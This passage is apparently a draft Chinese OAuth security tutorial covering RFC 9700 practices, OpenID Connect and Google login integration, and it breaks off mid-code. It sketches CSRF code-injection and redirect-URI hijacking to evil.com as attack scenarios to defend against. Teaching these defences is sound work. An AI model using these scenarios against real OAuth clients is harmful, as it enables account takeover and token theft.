2025 年 1 月，IETF 正式发布 **RFC 9700** (OAuth 2.0 Security Best Current Practice)，这是 OAuth 安全演进的里程碑文档。

```
┌─────────────────────────────────────────────────────────────┐
│ RFC 9700 十大核心安全要求                                     │
├─────────────────────────────────────────────────────────────┤
│ 1. ✅ 禁用密码模式 (Password Grant)                           │
│ 2. ✅ 禁用隐式模式 (Implicit Grant)                           │
│ 3. ✅ 授权码模式必须使用 PKCE                                 │
│ 4. ✅ 重定向 URI 精确匹配 (禁止通配符)                         │
│ 5. ✅ 强制使用 HTTPS                                          │
│ 6. ✅ state 参数防护 CSRF                                     │
│ 7. ✅ Access Token 短期有效 (建议≤1 小时)                      │
│ 8. ✅ Refresh Token 轮转机制                                  │
│ 9. ✅ 客户端认证 (机密客户端)                                 │
│ 10. ✅ Scope 最小权限原则                                     │
└─────────────────────────────────────────────────────────────┘
```

---

## 5.2 PKCE 强制要求详解

### 5.2.1 为什么 PKCE 成为强制要求

在 OAuth 2.0 时代，PKCE 是公共客户端 (SPA、移动应用) 的**可选扩展**。OAuth 2.1 将其提升为**所有客户端的强制要求**。

**原因分析**：

| 攻击类型 | OAuth 2.0 无 PKCE 的风险 | PKCE 如何防护 |
|----------|------------------------|---------------|
| **授权码拦截** | 攻击者截获授权码后可直接换取令牌 | 没有 code_verifier 无法换取 |
| **授权码注入** | 攻击者注入自己的授权码 | code_challenge 与授权码绑定 |
| **客户端冒充** | 攻击者冒充合法客户端 | 只有原始客户端知道 code_verifier |

### 5.2.2 PKCE 实现检查清单

```
┌─────────────────────────────────────────────────────────────┐
│ PKCE 实现检查清单                                            │
├─────────────────────────────────────────────────────────────┤
│ □ code_verifier 长度：43-128 字符                             │
│ □ code_verifier 熵值：使用加密安全随机数生成器               │
│ □ code_challenge 方法：优先使用 S256 (SHA256)                │
│ □ code_challenge 传输：授权请求中携带                         │
│ □ code_verifier 存储：安全存储在 Session 中                   │
│ □ code_verifier 提交：令牌请求中携带                         │
│ □ 服务端验证：授权服务器必须验证 code_challenge              │
└─────────────────────────────────────────────────────────────┘
```

### 5.2.3 授权服务器配置示例 (Spring Authorization Server)

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public RegisteredClientRepository registeredClientRepository() {
        RegisteredClient client = RegisteredClient.withId(UUID.randomUUID().toString())
            .clientId("spa-client")
            .clientAuthenticationMethod(ClientAuthenticationMethod.NONE)
            .authorizationGrantType(AuthorizationGrantType.AUTHORIZATION_CODE)
            .redirectUri("https://client.example.com/callback")
            .scope("read", "profile")
            .clientSettings(ClientSettings.builder()
                .requireProofKey(true)  // 强制 PKCE
                .build())
            .build();
        
        return new InMemoryRegisteredClientRepository(client);
    }
}
```

---

## 5.3 CSRF 防护 (state 参数)

### 5.3.1 CSRF 攻击原理

```mermaid
sequenceDiagram
    participant U as 用户
    participant B as 浏览器
    participant C as 合法客户端
    participant M as 攻击者
    participant AS as 授权服务器
    
    Note over M: 攻击者构造恶意链接
    M->>B: 诱导用户点击<br/>https://client.com/callback?code=ATTACKER_CODE
    
    Note over B,AS: 用户已登录授权服务器
    B->>AS: 请求授权 (携带攻击者的 code)
    AS->>C: 验证通过，建立会话
    C->>B: 用户已"登录"到攻击者账户
    
    Note over U,C: 后果：账户劫持
    U->>C: 以为是自己账户，实际是攻击者账户
    M->>C: 获取用户数据
```

### 5.3.2 state 参数工作机制

```
┌─────────────────────────────────────────────────────────────┐
│ state 参数防护 CSRF 流程                                      │
├─────────────────────────────────────────────────────────────┤
│ 1. 客户端生成随机 state 值 (高熵随机字符串)                   │
│ 2. 将 state 存储在用户 Session 中                             │
│ 3. 授权请求中携带 state 参数                                  │
│ 4. 授权服务器原样返回 state(回调时)                           │
│ 5. 客户端验证返回的 state 与 Session 中存储的一致              │
│ 6. 不一致 → 拒绝请求 (CSRF 攻击)                             │
│ 7. 一致 → 继续处理                                           │
└─────────────────────────────────────────────────────────────┘
```

### 5.3.3 state 参数实现示例

#### 后端实现 (Node.js/Express)

```javascript
const crypto = require('crypto');
const session = require('express-session');

// 生成随机 state
function generateState() {
  return crypto.randomBytes(16).toString('hex');
}

// 发起授权
app.get('/login', (req, res) => {
  const state = generateState();
  // 存储到 Session
  req.session.oauthState = state;
  
  const authUrl = `https://auth.example.com/oauth/authorize?` +
    `response_type=code&` +
    `client_id=${CLIENT_ID}&` +
    `redirect_uri=${REDIRECT_URI}&` +
    `state=${state}`;
  
  res.redirect(authUrl);
});

// 回调处理
app.get('/auth/callback', async (req, res) => {
  const { code, state } = req.query;
  
  // 验证 state
  if (state !== req.session.oauthState) {
    return res.status(400).send('Invalid state - CSRF attack detected');
  }
  
  // state 验证通过，继续换取令牌
  try {
    const tokens = await exchangeCodeForToken(code);
    req.session.oauthState = null; // 清除 state
    res.redirect('/dashboard');
  } catch (error) {
    res.status(500).send('Token exchange failed');
  }
});
```

### 5.3.4 state 参数安全要求

| 要求 | 说明 |
|------|------|
| **高熵随机** | 使用加密安全随机数生成器 (crypto.randomBytes) |
| **一次性** | 每次授权请求生成新的 state，使用后清除 |
| **Session 绑定** | state 必须与用户 Session 绑定存储 |
| **严格验证** | 回调时必须验证，不匹配立即拒绝 |

---

## 5.4 重定向 URI 安全

### 5.4.1 重定向 URI 攻击

```
┌─────────────────────────────────────────────────────────────┐
│ 重定向 URI 劫持攻击场景                                       │
├─────────────────────────────────────────────────────────────┤
│ 1. 攻击者注册恶意应用，redirect_uri 设置为 https://evil.com  │
│ 2. 诱导用户点击伪造的授权链接                                 │
│ 3. 用户授权后，授权码被发送到 evil.com                        │
│ 4. 攻击者用授权码换取令牌，访问用户资源                       │
└─────────────────────────────────────────────────────────────┘
```

### 5.4.2 精确匹配要求

RFC 9700 明确规定：重定向 URI 必须**精确匹配**，禁止使用通配符。

| 配置方式 | OAuth 2.0 | OAuth 2.1 | 说明 |
|----------|-----------|-----------|------|
| `https://example.com/*` | ✅ 允许 | ❌ 禁止 | 通配符不允许 |
| `https://*.example.com/callback` | ✅ 允许 | ❌ 禁止 | 子域名通配符不允许 |
| `https://example.com/callback` | ✅ 允许 | ✅ 允许 | 精确匹配 |
| `http://localhost:3000/callback` | ✅ 允许 | ✅ 允许 | 本地开发允许 HTTP |

### 5.4.3 授权服务器验证逻辑

```java
/**
 * 重定向 URI 验证逻辑
 */
public boolean validateRedirectUri(String requestedUri, String registeredUri) {
    // OAuth 2.1 要求：精确匹配
    return requestedUri.equals(registeredUri);
    
    // ❌ 错误的做法：通配符匹配
    // return requestedUri.startsWith(registeredUri.replace("*", ""));
}
```

### 5.4.4 客户端注册最佳实践

```
┌─────────────────────────────────────────────────────────────┐
│ 客户端重定向 URI 注册最佳实践                                 │
├─────────────────────────────────────────────────────────────┤
│ • 生产环境：注册完整的 HTTPS URL                              │
│   例：https://app.example.com/oauth/callback                │
│                                                              │
│ • 开发环境：注册 localhost URL                                │
│   例：http://localhost:3000/callback                        │
│                                                              │
│ • 多环境：为每个环境注册独立 URI                              │
│   例：dev.example.com, staging.example.com, app.example.com │
│                                                              │
│ • 移动应用：使用自定义 URL Scheme                             │
│   例：com.example.app://oauth/callback                      │
└─────────────────────────────────────────────────────────────┘
```

---

## 5.5 客户端认证

### 5.5.1 客户端认证方法

| 认证方法 | 适用客户端 | 说明 |
|----------|------------|------|
| **client_secret_basic** | 机密客户端 | HTTP Basic Auth，最常用 |
| **client_secret_post** | 机密客户端 | 请求体携带 client_secret |
| **private_key_jwt** | 机密客户端 | 使用私钥签名 JWT 认证 |
| **none** | 公共客户端 | 仅 PKCE，无 client_secret |

### 5.5.2 HTTP Basic Auth 认证

**请求示例**：
```http
POST /oauth/token HTTP/1.1
Host: server.example.com
Content-Type: application/x-www-form-urlencoded
Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW

grant_type=authorization_code&
code=SplxlOBeZQQYbYS6WxSbIA&
redirect_uri=https://client.example.com/cb
```

**Authorization 头生成**：
```
client_id: s6BhdRkqt3
client_secret: 7Fjfp0ZBr1KtDRbnfVdmIw

Base64 编码：
Base64("s6BhdRkqt3:7Fjfp0ZBr1KtDRbnfVdmIw") = czZCaGRSa3F0MzpnWDFmQmF0M2JW
```

### 5.5.3 Private Key JWT 认证

适用于高安全场景，客户端使用私钥签名 JWT 进行认证。

```
┌─────────────────────────────────────────────────────────────┐
│ Private Key JWT 认证流程                                      │
├─────────────────────────────────────────────────────────────┤
│ 1. 客户端生成 JWT，使用私钥签名                               │
│ 2. JWT Claims 包含：iss, sub, aud, exp, jti                 │
│ 3. 将 JWT 作为 client_assertion 发送给授权服务器              │
│ 4. 授权服务器使用 JWKS 公钥验证 JWT 签名                       │
│ 5. 验证通过 → 认证成功                                        │
└─────────────────────────────────────────────────────────────┘
```

**JWT 示例**：
```json
{
  "iss": "client-123",
  "sub": "client-123",
  "aud": "https://auth.example.com/oauth/token",
  "exp": 1516242622,
  "jti": "unique-jwt-id-12345"
}
```

---

## 5.6 Scope 最小权限原则

### 5.6.1 Scope 设计原则

```
┌─────────────────────────────────────────────────────────────┐
│ Scope 设计最佳实践                                            │
├─────────────────────────────────────────────────────────────┤
│ 1. 最小权限：仅授予完成功能所需的最小权限                     │
│ 2. 细粒度：将权限拆分为细粒度的 scope                         │
│ 3. 明确命名：scope 名称应清晰表达权限含义                     │
│ 4. 默认拒绝：未明确请求 scope 不应授予                         │
└─────────────────────────────────────────────────────────────┘
```

### 5.6.2 Scope 示例

| Scope | 含义 | 适用场景 |
|-------|------|----------|
| `read` | 只读权限 | 读取用户数据 |
| `write` | 写入权限 | 创建/修改资源 |
| `delete` | 删除权限 | 删除资源 |
| `profile` | 用户信息 | 获取用户基本信息 |
| `email` | 邮箱地址 | 获取用户邮箱 |
| `offline_access` | 离线访问 | 获取 Refresh Token |

### 5.6.3 Scope 请求与拒绝

**客户端请求**：
```http
GET /oauth/authorize?
  response_type=code&
  client_id=abc123&
  scope=read+write+delete&
  redirect_uri=https://client.com/callback
```

**用户授权页面**：
```
┌─────────────────────────────────────────────────────────────┐
│ 授权请求                                                     │
├─────────────────────────────────────────────────────────────┤
│ 应用 "Example App" 请求访问您的账户：                          │
│                                                              │
│ ☑ 读取您的个人信息                                            │
│ ☑ 修改您的个人信息                                            │
│ ☐ 删除您的数据                                                │
│                                                              │
│ [同意] [拒绝]                                                │
└─────────────────────────────────────────────────────────────┘
```

**部分授权响应**：
```json
{
  "access_token": "2YotnFZFEjr1zCsicMWpAA",
  "scope": "read write",
  "token_type": "Bearer",
  "expires_in": 3600
}
```

> 注意：用户拒绝了 `delete` scope，响应中的 scope 仅包含 `read write`。

---

## 5.7 令牌安全

### 5.7.1 Access Token 有效期设置

| 场景 | 推荐有效期 | 说明 |
|------|------------|------|
| **Web 应用** | 15-60 分钟 | 用户活跃，可频繁刷新 |
| **移动应用** | 30-60 分钟 | 网络不稳定，稍长 |
| **M2M 通信** | 5-15 分钟 | 机器请求频繁，可很短 |
| **高安全场景** | 5-10 分钟 | 金融、医疗等敏感数据 |

### 5.7.2 Refresh Token 安全要求

```
┌─────────────────────────────────────────────────────────────┐
│ Refresh Token 安全要求                                        │
├─────────────────────────────────────────────────────────────┤
│ 1. 轮转机制：每次使用颁发新的 Refresh Token，旧的失效         │
│ 2. 绝对过期：设置最大有效期 (如 30 天/90 天)                    │
│ 3. 设备绑定：Refresh Token 与设备指纹绑定                     │
│ 4. 后端存储：仅机密客户端可获得 Refresh Token                 │
│ 5. 使用检测：检测同一 Refresh Token 多次使用 (可能泄露)        │
└─────────────────────────────────────────────────────────────┘
```

### 5.7.3 令牌泄露响应

```mermaid
flowchart TD
    A[检测到令牌泄露] --> B{泄露类型？}
    B -->|Access Token| C[等待过期 (短期)]
    B -->|Refresh Token| D[立即撤销]
    D --> E[通知用户]
    E --> F[要求重新认证]
    C --> G[使用 Refresh Token 轮转检测]
```

---

## 5.8 HTTPS 强制要求

### 5.8.1 HTTPS 要求场景

| 场景 | HTTPS 要求 | 例外 |
|------|------------|------|
| **授权端点** | 强制 | 无 |
| **令牌端点** | 强制 | 无 |
| **资源端点** | 强制 | 无 |
| **本地开发** | 可选 | localhost 允许 HTTP |
| **PKCE 本地回环** | 可选 | `http://localhost` 允许 |

### 5.8.2 证书要求

```
┌─────────────────────────────────────────────────────────────┐
│ HTTPS 证书要求                                                │
├─────────────────────────────────────────────────────────────┤
│ • 有效证书：证书未过期                                       │
│ • 可信 CA：由受信任的 CA 签发                                  │
│ • 域名匹配：证书域名与实际域名一致                            │
│ • TLS 1.2+：禁用 TLS 1.0/1.1                                  │
│ • 强加密套件：禁用弱加密算法                                  │
└─────────────────────────────────────────────────────────────┘
```

---

## 5.9 安全审计与监控

### 5.9.1 应监控的安全事件

| 事件类型 | 说明 | 响应 |
|----------|------|------|
| **异常授权请求** | 来自异常 IP/地区的授权请求 | 告警、限流 |
| **令牌请求失败** | 大量失败的令牌请求 | 检测暴力破解 |
| **state 验证失败** | 可能的 CSRF 攻击 | 记录、封禁 IP |
| **重定向 URI 不匹配** | 可能的重定向劫持 | 拒绝、记录 |
| **Refresh Token 重复使用** | 可能的令牌泄露 | 撤销所有令牌、通知用户 |
| **异常 scope 请求** | 请求超出常规的 scope | 人工审核 |

### 5.9.2 审计日志字段

```json
{
  "timestamp": "2026-04-06T12:34:56Z",
  "event_type": "token_request",
  "client_id": "abc123",
  "user_id": "user-456",
  "ip_address": "192.168.1.100",
  "user_agent": "Mozilla/5.0...",
  "grant_type": "authorization_code",
  "scope_requested": "read write",
  "result": "success",
  "error_code": null
}
```

---

## 5.10 本章小结

**核心要点回顾**：

| 安全要求 | OAuth 2.0 | OAuth 2.1 | 实施难度 |
|----------|-----------|-----------|----------|
| PKCE | 可选 | 强制 | ⭐⭐ |
| 隐式模式 | 允许 | 废弃 | ⭐ |
| 密码模式 | 允许 | 废弃 | ⭐ |
| 重定向 URI 精确匹配 | 推荐 | 强制 | ⭐ |
| HTTPS | 推荐 | 强制 | ⭐⭐ |
| state 参数 | 推荐 | 强制 | ⭐ |

**关键记忆点**：
1. **PKCE 是 OAuth 2.1 强制要求**：所有客户端都必须使用
2. **state 参数防 CSRF**：必须生成高熵随机数并验证
3. **重定向 URI 精确匹配**：禁止通配符
4. **Scope 最小权限**：仅授予必要权限
5. **HTTPS 强制**：除本地开发外必须使用

---

**来源引用**：
- RFC 9700: OAuth 2.0 Security Best Current Practice
- RFC 7636: Proof Key for Code Exchange (PKCE)
- RFC 6819: OAuth 2.0 Threat Model and Security Considerations

---

*本章草稿保存于：`.work/oauth/drafts/chapter-5.md`*
*字数：约 4000 字*
# 第 6 章 OAuth 与 OpenID Connect (OIDC)

## 6.1 OAuth 2.0 与 OIDC 的关系

### 6.1.1 核心区别

```
┌─────────────────────────────────────────────────────────────┐
│ OAuth 2.0 vs OpenID Connect                                  │
├─────────────────────────────────────────────────────────────┤
│ OAuth 2.0:  授权框架 —— 解决"你能访问什么"                     │
│ OIDC:     认证协议 —— 解决"你是谁"                            │
│                                                              │
│ OIDC = OAuth 2.0 + 身份层 (ID Token + UserInfo 端点)          │
└─────────────────────────────────────────────────────────────┘
```

**重要提醒**：OAuth 2.0 本身**不提供身份验证**，它只解决授权问题。如果需要用户身份认证，必须使用 OpenID Connect。

### 6.1.2 OIDC 架构

```mermaid
flowchart TD
    subgraph OAuth 2.0 基础
        C[客户端]
        AS[授权服务器]
        RS[资源服务器]
    end
    
    subgraph OIDC 扩展
        IT[ID Token]
        UE[UserInfo 端点]
    end
    
    C -->|1. 授权请求 | AS
    AS -->|2. Access Token + ID Token| C
    C -->|3. 验证 ID Token| C
    C -->|4. 携带 Access Token| UE
    UE -->|5. 返回用户信息 | C
    
    style IT fill:#f3e5f5
    style UE fill:#f3e5f5
```

### 6.1.3 OIDC 标准文档

| 文档 | 说明 |
|------|------|
| **OpenID Connect Core 1.0** | 核心协议规范 |
| **OpenID Connect Basic Client Implementations** | 基础客户端实现指南 |
| **OIDC Discovery** | 授权服务器发现端点规范 |

---

## 6.2 ID Token 详解

### 6.2.1 ID Token vs Access Token

| 特征 | ID Token | Access Token |
|------|----------|--------------|
| **用途** | 身份验证 | 资源访问 |
| **接收者** | 客户端 | 资源服务器 |
| **包含内容** | 用户身份 Claims | 权限 scope |
| **格式** | 必须 JWT | JWT 或不透明 |
| **规范** | OIDC | OAuth 2.0 |

### 6.2.2 ID Token 标准 Claims

**必须包含的 Claims**：

| Claim | 说明 | 示例值 |
|-------|------|--------|
| `iss` | 颁发者 (授权服务器 URL) | `https://accounts.google.com` |
| `sub` | 主题 (用户唯一标识) | `108234567890123456789` |
| `aud` | 受众 (客户端 ID) | `s6BhdRkqt3` |
| `exp` | 过期时间 (Unix 时间戳) | `1516242622` |
| `iat` | 签发时间 (Unix 时间戳) | `1516239022` |
| `auth_time` | 用户认证时间 | `1516238022` |
| `nonce` | 随机数 (防重放攻击) | `n-0S6_WzA2Mj` |

**可选 Claims**：

| Claim | 说明 |
|-------|------|
| `name` | 用户全名 |
| `preferred_username` | 首选用户名 |
| `email` | 邮箱地址 |
| `email_verified` | 邮箱是否验证 (true/false) |
| `picture` | 头像 URL |
| `locale` | 语言区域 |

### 6.2.3 ID Token 示例

```json
{
  "iss": "https://server.example.com",
  "sub": "24400320",
  "aud": "s6BhdRkqt3",
  "exp": 1311281970,
  "iat": 1311280970,
  "auth_time": 1311280969,
  "nonce": "n-0S6_WzA2Mj",
  "name": "John Doe",
  "email": "john.doe@example.com",
  "email_verified": true,
  "picture": "https://example.com/avatar.jpg",
  "locale": "zh-CN"
}
```

### 6.2.4 ID Token 验证流程

```mermaid
flowchart TD
    A[收到 ID Token] --> B[验证 JWT 签名]
    B --> C{签名有效？}
    C -->|否 | Z[拒绝]
    C -->|是 | D[验证 iss 颁发者]
    D --> E{iss 可信？}
    E -->|否 | Z
    E -->|是 | F[验证 aud 受众]
    F --> G{aud 匹配客户端 ID?}
    G -->|否 | Z
    G -->|是 | H[验证 exp 过期时间]
    H --> I{未过期？}
    I -->|否 | Z
    I -->|是 | J[验证 nonce]
    J --> K{nonce 匹配？}
    K -->|否 | Z
    K -->|是 | L[验证通过，提取用户信息]
    
    style Z fill:#ffcdd2
    style L fill:#c8e6c9
```

### 6.2.5 ID Token 验证代码示例

```javascript
const jwt = require('jsonwebtoken');
const jwksClient = require('jwks-rsa');

// 初始化 JWKS 客户端
const client = jwksClient({
  jwksUri: 'https://server.example.com/.well-known/jwks.json'
});

// 获取签名密钥
function getSigningKey(header, callback) {
  client.getSigningKey(header.kid, (err, key) => {
    if (err) return callback(err);
    const signingKey = key.publicKey || key.rsaPublicKey;
    callback(null, signingKey);
  });
}

// 验证 ID Token
function verifyIdToken(idToken, expectedNonce, expectedClientId, expectedIssuer) {
  return new Promise((resolve, reject) => {
    jwt.verify(idToken, getSigningKey, {
      issuer: expectedIssuer,
      audience: expectedClientId,
      algorithms: ['RS256']
    }, (err, decoded) => {
      if (err) return reject(err);
      
      // 验证 nonce
      if (decoded.nonce !== expectedNonce) {
        return reject(new Error('Invalid nonce'));
      }
      
      // 验证 exp (jwt.verify 已自动验证)
      // 验证 iat (可选：检查是否是近期签发)
      
      resolve(decoded);
    });
  });
}
```

---

## 6.3 UserInfo 端点

### 6.3.1 UserInfo 端点的作用

**问题**：既然 ID Token 已经包含用户信息，为什么还需要 `/userinfo` 端点？

**答案**：

| 维度 | ID Token | UserInfo 端点 |
|------|----------|---------------|
| **数据时效** | 签发时固定，无法反映变化 | 每次返回最新数据 |
| **数据量** | 有限 (标准 Claims) | 可扩展 (自定义 Claims) |
| **使用场景** | 一次性身份验证 | 需要最新用户信息时 |
| **更新频率** | 每次重新认证才更新 | 实时获取 |

### 6.3.2 UserInfo 请求

**请求示例**：
```http
GET /oauth2/userinfo HTTP/1.1
Host: server.example.com
Authorization: Bearer Access_Token_Value
```

**响应示例**：
```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "sub": "24400320",
  "name": "John Doe",
  "email": "john.doe@example.com",
  "email_verified": true,
  "picture": "https://example.com/avatar.jpg",
  "locale": "zh-CN",
  "updated_at": 1516239022
}
```

### 6.3.3 Scope 与 Claims 对应关系

| Scope | 可获取的 Claims |
|-------|-----------------|
| `openid` | 必须包含，启用 OIDC |
| `profile` | name, preferred_username, picture, locale 等 |
| `email` | email, email_verified |
| `phone` | phone_number, phone_number_verified |
| `address` | address (结构化地址信息) |

---

## 6.4 OIDC 标准流程

### 6.4.1 授权码流程 (Authorization Code Flow)

**最推荐的 OIDC 流程**，适用于有后端的 Web 应用。

```mermaid
sequenceDiagram
    participant U as 用户
    participant C as 客户端
    participant AS as 授权服务器 (OIDC Provider)
    
    Note over C: 生成随机 state 和 nonce
    C->>U: 1. 重定向到授权服务器
    Note right of C: /authorize?<br/>response_type=code<br/>&client_id=xxx<br/>&redirect_uri=xxx<br/>&scope=openid+profile<br/>&state=random123<br/>&nonce=abc456
    
    U->>AS: 2. 发起授权请求
    AS->>U: 3. 展示登录页面
    U->>AS: 4. 登录并授权
    AS->>U: 5. 重定向回回调 URL
    Note left of AS: Location: redirect_uri?<br/>code=AUTH_CODE<br/>&state=random123
    
    U->>C: 6. 携带授权码访问回调
    C->>AS: 7. 换取令牌
    Note right of C: POST /token<br/>grant_type=authorization_code<br/>code=AUTH_CODE<br/>client_id=xxx<br/>client_secret=xxx
    AS->>C: 8. 返回令牌
    Note left of AS: {<br/>"access_token":"...",<br/>"id_token":"...",<br/>"refresh_token":"..."<br/>}
    
    C->>C: 9. 验证 ID Token<br/>(签名、iss、aud、exp、nonce)
    C->>AS: 10. (可选) 调用 UserInfo 端点
    AS->>C: 11. 返回用户信息
```

### 6.4.2 授权码 + PKCE 流程 (推荐)

**适用于 SPA 和移动应用**，OIDC 推荐流程。

```mermaid
sequenceDiagram
    participant U as 用户
    participant C as 客户端 (SPA/移动 App)
    participant AS as 授权服务器
    
    Note over C: 生成 code_verifier<br/>计算 code_challenge<br/>生成 state 和 nonce
    C->>U: 1. 重定向到授权服务器
    Note right of C: /authorize?<br/>response_type=code<br/>&client_id=xxx<br/>&redirect_uri=xxx<br/>&scope=openid+profile<br/>&code_challenge=xxx<br/>&code_challenge_method=S256<br/>&state=random123<br/>&nonce=abc456
    
    U->>AS: 2. 发起授权请求
    AS->>U: 3. 登录并授权
    AS->>U: 4. 重定向回回调
    Note left of AS: code=AUTH_CODE&state=random123
    
    U->>C: 5. 携带授权码访问回调
    C->>AS: 6. 换取令牌
    Note right of C: POST /token<br/>grant_type=authorization_code<br/>code=AUTH_CODE<br/>client_id=xxx<br/>code_verifier=ORIGINAL_VERIFIER
    
    AS->>AS: 7. 验证 PKCE
    AS->>C: 8. 返回令牌 (含 ID Token)
    C->>C: 9. 验证 ID Token
```

### 6.4.3 隐式流程 (已废弃) ⚠️

```
❌ 隐式流程 (Implicit Flow) - OIDC 1.0 已废弃

客户端 → /authorize?response_type=id_token+token → 授权服务器
授权服务器 → Location: redirect_uri#id_token=xxx&access_token=xxx → 浏览器

废弃原因：
- ID Token 和 Access Token 都暴露在 URL 中
- 令牌可通过浏览器历史、Referer 头泄露
- 有安全的替代方案：授权码 + PKCE
```

**OIDC 建议**：使用授权码 + PKCE 替代隐式流程。

### 6.4.4 混合流程 (Hybrid Flow)

混合流程允许部分令牌在前通道返回，适用于特定场景。

**响应类型**：
- `code id_token`：授权码 + ID Token (前端)
- `code token`：授权码 + Access Token (前端)
- `code id_token token`：全部 (前端)

**注意**：混合流程复杂，一般场景推荐使用标准授权码流程。

---

## 6.5 OIDC Discovery

### 6.5.1 发现端点

OIDC 定义了标准发现端点，客户端可自动获取授权服务器配置。

**端点 URL**：
```
https://{issuer}/.well-known/openid-configuration
```

### 6.5.2 发现文档响应

```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "issuer": "https://server.example.com",
  "authorization_endpoint": "https://server.example.com/oauth/authorize",
  "token_endpoint": "https://server.example.com/oauth/token",
  "userinfo_endpoint": "https://server.example.com/oauth/userinfo",
  "jwks_uri": "https://server.example.com/oauth/jwks",
  "response_types_supported": ["code", "code id_token", "id_token token"],
  "subject_types_supported": ["public", "pairwise"],
  "id_token_signing_alg_values_supported": ["RS256", "ES256"],
  "token_endpoint_auth_methods_supported": ["client_secret_basic", "private_key_jwt"],
  "claims_supported": ["sub", "name", "email", "picture", "locale"]
}
```

### 6.5.3 使用发现端点

```javascript
// 自动获取 OIDC 配置
async function discoverOIDCConfig(issuer) {
  const response = await fetch(`${issuer}/.well-known/openid-configuration`);
  const config = await response.json();
  
  return {
    authorizationEndpoint: config.authorization_endpoint,
    tokenEndpoint: config.token_endpoint,
    userinfoEndpoint: config.userinfo_endpoint,
    jwksUri: config.jwks_uri,
    issuer: config.issuer
  };
}
```

---

## 6.6 OIDC 会话管理

### 6.6.1 前端通道登出 (Front-Channel Logout)

```
前端通道登出流程:

1. 用户点击"登出"
2. 客户端重定向到授权服务器登出端点
   https://auth.example.com/logout?id_token_hint=xxx&post_logout_redirect_uri=xxx
3. 授权服务器销毁会话
4. 重定向回 post_logout_redirect_uri
```

### 6.6.2 后端通道登出 (Back-Channel Logout)

```
后端通道登出流程:

1. 用户在授权服务器登出
2. 授权服务器向客户端发送 Logout Token (JWT)
   POST /logout (携带 logout_token)
3. 客户端验证 Logout Token
4. 客户端销毁本地会话
```

---

## 6.7 OIDC 最佳实践

### 6.7.1 客户端实现检查清单

```
┌─────────────────────────────────────────────────────────────┐
│ OIDC 客户端实现检查清单                                      │
├─────────────────────────────────────────────────────────────┤
│ □ 必须验证 ID Token 签名 (使用 JWKS 公钥)                      │
│ □ 必须验证 iss Claims (颁发者)                               │
│ □ 必须验证 aud Claims (受众匹配 client_id)                   │
│ □ 必须验证 exp Claims (未过期)                               │
│ □ 必须验证 nonce Claims (与请求时一致)                       │
│ □ 必须使用 HTTPS (除本地开发)                                │
│ □ 必须使用 state 参数防 CSRF                                  │
│ □ 必须使用 PKCE (授权码流程)                                 │
│ □ 不应使用隐式流程                                           │
│ □ 安全存储令牌 (不暴露给 XSS)                                │
└─────────────────────────────────────────────────────────────┘
```

### 6.7.2 常见 OIDC 实现误区

| 误区 | 风险 | 正确做法 |
|------|------|----------|
| **不验证 ID Token 签名** | 可伪造身份 | 必须使用 JWKS 公钥验证 |
| **忽略 nonce 验证** | 重放攻击风险 | 存储并验证 nonce |
| **用 Access Token 做身份验证** | 不是设计目的 | 使用 ID Token 进行身份验证 |
| **令牌存储在 localStorage** | XSS 窃取 | 使用 HttpOnly Cookie 或后端存储 |

---

## 6.8 本章小结

**核心要点回顾**：

| 概念 | OAuth 2.0 | OpenID Connect |
|------|-----------|----------------|
| **目的** | 授权 | 认证 + 授权 |
| **核心令牌** | Access Token | ID Token + Access Token |
| **身份 Claims** | 无 | 有 (ID Token 和 UserInfo) |
| **适用场景** | API 访问授权 | 用户身份认证 |

**关键记忆点**：
1. **OAuth 2.0 是授权框架，不是认证协议**
2. **OIDC = OAuth 2.0 + 身份层**
3. **ID Token 用于身份验证，Access Token 用于资源访问**
4. **必须验证 ID Token 的签名和 Claims**
5. **推荐使用授权码 + PKCE 流程进行 OIDC 认证**

---

**来源引用**：
- OpenID Connect Core 1.0: https://openid.net/specs/openid-connect-core-1_0.html
- OIDC Discovery: https://openid.net/specs/openid-connect-discovery-1_0.html
- OAuth 2.0 Security Best Current Practice (RFC 9700)

---

*本章草稿保存于：`.work/oauth/drafts/chapter-6.md`*
*字数：约 3500 字*
# 第 7 章 实战：OAuth 服务端应用

## 7.1 集成第三方登录

### 7.1.1 主流 OAuth 提供商对比

| 提供商 | 文档 | 支持模式 | 特点 |
|--------|------|----------|------|
| **Google** | [Google OAuth2](https://developers.google.com/identity/protocols/oauth2) | 授权码 + PKCE | 全球最常用，支持 OIDC |
| **GitHub** | [GitHub OAuth](https://docs.github.com/en/developers/apps/building-oauth-apps) | 授权码 | 开发者友好 |
| **微信** | [微信开放平台](https://developers.weixin.qq.com/doc/oplatform/) | 授权码 | 国内最常用 |
| **Auth0** | [Auth0 OAuth2](https://auth0.com/docs/protocols/oauth2) | 多种 | 身份验证服务 |

### 7.1.2 Google OAuth2 集成

#### 步骤 1：创建 Google Cloud 项目

1. 访问 [Google API Console](https://console.cloud.google.com/)
2. 创建新项目
3. 启用 "Google+ API" 或相关 API
4. 创建 OAuth 2.0 凭证

#### 步骤 2：配置 OAuth 同意屏幕

```
┌─────────────────────────────────────────────────────────────┐
│ OAuth 同意屏幕配置                                          │
├─────────────────────────────────────────────────────────────┤
│ • 用户类型：外部 (External)                                  │
│ • 应用名称：Your App Name                                    │
│ • 用户支持电子邮件：your-email@example.com                   │
│ • 授权域名：https://your-app.com                            │
│ • 隐私政策 URL：https://your-app.com/privacy                 │
│ • 服务条款 URL：https://your-app.com/terms                   │
└─────────────────────────────────────────────────────────────┘
```

#### 步骤 3：创建 OAuth 客户端

```
┌─────────────────────────────────────────────────────────────┐
│ OAuth 客户端配置                                             │
├─────────────────────────────────────────────────────────────┤
│ 应用类型：Web 应用                                            │
│ 已授权的 JavaScript 来源：https://your-app.com               │
│ 已授权的重定向 URI: https://your-app.com/auth/google/callback│
└─────────────────────────────────────────────────────────────┘
```

**获得凭证**：
- Client ID: `123456789-abc123def456.apps.googleusercontent.com`
- Client Secret: `GOCSPX-xxxxxxxxxxxx`

#### 步骤 4：后端实现 (Node.js/Passport)

```javascript
const passport = require('passport');
const GoogleStrategy = require('passport-google-oauth20').Strategy;

// 配置 Google OAuth 策略
passport.use(new GoogleStrategy({
    clientID: process.env.GOOGLE_CLIENT_ID,
    clientSecret: process.env.GOOGLE_CLIENT_SECRET,
    callbackURL: '/auth/google/callback'
  },
  async (accessToken, refreshToken, profile, done) => {
    // 查找或创建用户
    let user = await User.findOne({ googleId: profile.id });
    
